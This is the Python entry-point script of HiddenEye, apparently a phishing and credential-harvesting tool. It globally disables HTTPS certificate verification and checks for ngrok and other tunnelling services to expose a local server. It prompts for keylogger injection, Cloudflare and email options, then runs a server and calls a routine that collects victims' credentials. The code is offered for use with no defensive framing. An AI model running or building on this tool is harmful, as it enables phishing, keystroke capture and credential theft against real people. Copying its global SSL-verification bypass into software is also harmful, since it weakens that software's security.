#!/usr/bin/python3
#
# HiddenEye by https://github.com/DarkSecDevelopers
#

from Defs.Languages import *
from Defs.Actions import *
from Defs.Configurations import *
from Defs.Checks import *
import multiprocessing
import gettext
import sys
import ssl
from os import system, environ

if(not environ.get('PYTHONHTTPSVERIFY', "") and getattr(ssl, '_create_unverified_context', None)):
    ssl._create_default_https_context = ssl._create_unverified_context


RED, WHITE, CYAN, GREEN, DEFAULT = '\033[91m', '\033[46m', '\033[36m', '\033[1;32m',  '\033[0m'

installGetText()
languageSelector()
checkConnection()
verCheck()
checkPHP()
checkLocalxpose()
checkNgrok()
checkOpenport()
checkPagekite()
checkLT()
ifSettingsNotExists()
readConfig()

if __name__ == "__main__":
    try:
        runMainMenu()
        mainMenu()

        keyloggerprompt()
        addingkeylogger()
        cloudfarePrompt()
        emailPrompt()
        inputCustom()
        port = selectPort()

        ##############
        runServer(port)
        selectServer(port)

        multiprocessing.Process(target=runServer, args=(port,)).start()
        getCredentials(port)

    except KeyboardInterrupt:
        port = '8080' # When Keyword Interrupt Occurs before defining Port by User. Script will use 8080 port.(Just To Remove Exception Errors)
        endMessage(port)
        exit()
